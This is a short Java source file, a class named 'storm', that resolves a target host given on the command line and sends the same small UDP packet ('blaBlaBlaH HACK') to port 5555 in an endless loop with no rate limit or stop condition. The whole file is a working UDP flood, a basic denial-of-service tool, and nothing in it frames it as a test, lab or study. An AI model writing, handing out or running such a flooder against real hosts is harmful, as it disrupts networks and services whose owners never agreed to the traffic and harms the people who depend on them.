import java.net.*;

public class storm {
	public static void main(String[] args) throws Exception{
		InetAddress inet = InetAddress.getByName(args[0]);
		DatagramSocket soc = new DatagramSocket();
		byte[] data = new String("blaBlaBlaH HACK").getBytes();
		DatagramPacket pac = new DatagramPacket(data, data.length, inet, 5555);
		while(true){
			soc.send(pac);
		}
	}
}
